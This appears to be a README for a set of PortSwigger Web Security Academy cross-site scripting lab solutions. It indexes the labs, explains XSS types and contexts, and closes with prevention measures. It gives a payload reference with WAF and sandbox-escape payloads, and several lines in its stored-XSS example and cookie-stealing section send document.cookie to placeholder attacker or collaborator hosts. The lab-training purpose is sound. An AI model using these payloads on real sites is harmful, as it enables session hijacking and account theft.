# 🔥 PortSwigger Cross-Site Scripting (XSS) Labs

> Solutions and write-ups for the **Cross-Site Scripting (XSS)** module from [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting).

---

## 📖 What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to compromise the interactions users have with a vulnerable application. It works by manipulating a vulnerable website into returning malicious JavaScript to users. When the code executes in the victim's browser, the attacker can:

- **Steal session cookies** and hijack user accounts
- **Perform actions** on behalf of the victim
- **Capture keystrokes** and credentials
- **Redirect users** to phishing pages
- **Deliver malware** or browser exploits

> ⚠️ **Note on `alert()` vs `print()`:** From Chrome v92+, cross-origin iframes block `alert()`. For affected labs, use `print()` instead. Both are accepted as valid PoC payloads on PortSwigger labs.

---

## 🗂️ Lab Index

### 🟢 Apprentice

| # | Lab | Type | Context |
|---|-----|------|---------|
| 1 | Reflected XSS into HTML context with nothing encoded | Reflected | HTML |
| 2 | Stored XSS into HTML context with nothing encoded | Stored | HTML |
| 3 | DOM XSS in `document.write` sink using source `location.search` | DOM | `document.write` |
| 4 | DOM XSS in `innerHTML` sink using source `location.search` | DOM | `innerHTML` |
| 5 | DOM XSS in jQuery anchor `href` attribute sink using `location.search` source | DOM | jQuery |
| 6 | DOM XSS in jQuery selector sink using a hashchange event | DOM | jQuery |
| 7 | Reflected XSS into attribute with angle brackets HTML-encoded | Reflected | HTML attribute |
| 8 | Stored XSS into anchor `href` attribute with double quotes HTML-encoded | Stored | HTML attribute |
| 9 | Reflected XSS into a JavaScript string with angle brackets HTML encoded | Reflected | JS string |

### 🟡 Practitioner

| # | Lab | Type | Context |
|---|-----|------|---------|
| 10 | DOM XSS in `document.write` sink using source `location.search` inside a select element | DOM | `document.write` |
| 11 | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | DOM | AngularJS |
| 12 | Reflected DOM XSS | DOM | Reflected + DOM |
| 13 | Stored DOM XSS | DOM | Stored + DOM |
| 14 | Exploiting XSS to perform CSRF | Stored | CSRF chain |
| 15 | Exploiting cross-site scripting to steal cookies | Stored | Cookie theft |
| 16 | Exploiting XSS to capture passwords | Stored | Credential theft |
| 17 | Reflected XSS into HTML context with most tags and attributes blocked | Reflected | WAF bypass |
| 18 | Reflected XSS into HTML context with all tags blocked except custom ones | Reflected | WAF bypass |
| 19 | Reflected XSS with some SVG markup allowed | Reflected | SVG bypass |
| 20 | Reflected XSS in canonical link tag | Reflected | HTML `<link>` |
| 21 | Reflected XSS into a JavaScript string with single quote and backslash escaped | Reflected | JS string |
| 22 | Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | Reflected | JS string |
| 23 | Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | Stored | JS event handler |
| 24 | Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | Reflected | JS template literal |
| 25 | Reflected XSS with event handlers and `href` attributes blocked | Reflected | WAF bypass |
| 26 | Reflected XSS in a JavaScript URL with some characters blocked | Reflected | JS URL |
| 27 | Reflected XSS with AngularJS sandbox escape without strings | DOM | AngularJS sandbox |
| 28 | Reflected XSS with AngularJS sandbox escape and CSP | DOM | AngularJS + CSP |

### 🔴 Expert

| # | Lab | Type | Context |
|---|-----|------|---------|
| 29 | Reflected XSS with CSP bypass | Reflected | CSP |
| 30 | Stored XSS with CSP bypass | Stored | CSP |

---

## 🧠 XSS Types Explained

### 1. Reflected XSS
The malicious script arrives in the current HTTP request and is immediately reflected back to the user. Requires tricking the victim into visiting a crafted URL.

**Example:**
```
https://vulnerable.com/search?q=<script>alert(1)</script>
```

### 2. Stored XSS
The malicious script is persisted in the application's database and served to all users who view the affected page (e.g., blog comments, user profiles). No user interaction beyond visiting the page is required.

**Example:**
```html
<!-- In a comment field -->
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

### 3. DOM-Based XSS
The vulnerability exists in client-side JavaScript that processes attacker-controllable data (sources) and writes it to a dangerous function (sinks) without sanitization. Never touches the server.

**Common Sources:** `location.search`, `location.hash`, `document.referrer`, `window.name`

**Common Sinks:** `document.write()`, `innerHTML`, `eval()`, `location.href`, jQuery `$()`

---

## 🎯 XSS Contexts

| Context | Escape Goal | Example Payload |
|---------|-------------|-----------------|
| HTML body | Inject new tag | `<img src=x onerror=alert(1)>` |
| HTML attribute (double-quoted) | Break out of attribute | `" onmouseover="alert(1)` |
| HTML attribute (single-quoted) | Break out of attribute | `' onmouseover='alert(1)` |
| JS string (single-quoted) | Break out of string | `'-alert(1)-'` |
| JS string (double-quoted) | Break out of string | `"-alert(1)-"` |
| JS template literal | Inject template expression | `` ${alert(1)} `` |
| `href` / `src` attribute | Use JS pseudo-protocol | `javascript:alert(1)` |
| AngularJS expression | CSTI exploitation | `{{constructor.constructor('alert(1)')()}}` |

---

## 🛠️ Tools & Environment

| Tool | Purpose |
|------|---------|
| [Burp Suite](https://portswigger.net/burp) | Intercept, modify, and replay HTTP requests |
| Burp Intruder | Fuzz tags/attributes to find WAF bypasses |
| [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) | Automated DOM XSS source/sink discovery |
| Exploit Server | Host and deliver payloads to simulated victims |
| [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | Comprehensive payload reference |

---

## 📂 Repository Structure

```
XSS/
├── 01-reflected-html-nothing-encoded/
├── 02-stored-html-nothing-encoded/
├── 03-dom-document-write/
├── 04-dom-innerhtml/
├── 05-dom-jquery-href/
├── 06-dom-jquery-hashchange/
├── 07-reflected-attribute-angle-brackets-encoded/
├── 08-stored-href-double-quotes-encoded/
├── 09-reflected-js-string-angle-brackets-encoded/
├── 10-dom-document-write-select/
├── 11-dom-angularjs-expression/
├── 12-reflected-dom-xss/
├── 13-stored-dom-xss/
├── 14-xss-to-csrf/
├── 15-steal-cookies/
├── 16-capture-passwords/
├── 17-waf-bypass-most-tags-blocked/
├── 18-waf-bypass-custom-tags/
├── 19-svg-markup-allowed/
├── 20-canonical-link-tag/
├── 21-js-string-single-quote-backslash-escaped/
├── 22-js-string-angle-brackets-encoded-single-quote-escaped/
├── 23-stored-onclick-all-escaped/
├── 24-template-literal/
├── 25-event-handlers-href-blocked/
├── 26-javascript-url-characters-blocked/
├── 27-angularjs-sandbox-escape-no-strings/
├── 28-angularjs-sandbox-escape-csp/
├── 29-csp-bypass-reflected/
└── 30-csp-bypass-stored/
```

---

## 💡 Key Payloads Reference

### Basic PoC
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onresize=print()>
```

### Attribute Injection
```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus='alert(1)
```

### JavaScript String Escape
```javascript
'-alert(1)-'
\'-alert(1)//
</script><script>alert(1)</script>
```

### Template Literal
```javascript
${alert(1)}
```

### Cookie Stealing (Stored XSS)
```javascript
<script>
fetch('https://YOUR-COLLABORATOR.oastify.com?c='+document.cookie)
</script>

<script>
document.location='https://YOUR-COLLABORATOR.oastify.com/steal?c='+document.cookie
</script>
```

### DOM XSS via `innerHTML`
```html
<img src=1 onerror=alert(1)>
```
> ⚠️ `<script>` tags do **not** execute via `innerHTML` — use event handlers instead.

### AngularJS Sandbox Escape
```javascript
{{constructor.constructor('alert(1)')()}}
```

### WAF Bypass — Custom / SVG Tags
```html
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
<svg><animatetransform onbegin=alert(1) attributeName=transform>
<body onresize=print()>
```

### iframe Delivery via Exploit Server
```html
<iframe src="https://LAB-ID.web-security-academy.net/?search=<body onresize=print()>"
  onload="this.style.width='100px'">
</iframe>
```

### CSP Bypass via Nonce Leak
```html
<script nonce="LEAKED_NONCE">alert(1)</script>
```

---

## 🛡️ Prevention

| Defense | Description |
|---------|-------------|
| **Output encoding** | Encode user-controlled data before rendering in HTML, JS, or URLs |
| **Content Security Policy (CSP)** | Restrict which scripts are allowed to execute |
| **Input validation** | Reject or sanitize unexpected characters on input |
| **Use safe APIs** | Prefer `textContent` over `innerHTML`; avoid `eval()`, `document.write()` |
| **HttpOnly cookies** | Prevent JavaScript from accessing session cookies |
| **Trusted Types** | Browser API to prevent DOM XSS sinks from receiving strings |

---

## ⚠️ Disclaimer

> This repository is strictly for **educational purposes**. All labs are performed on intentionally vulnerable environments provided by PortSwigger Web Security Academy. Never test these techniques against real systems without explicit written authorization.

---

## 📚 References

- [PortSwigger XSS Learning Path](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [Content Security Policy (CSP) Bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
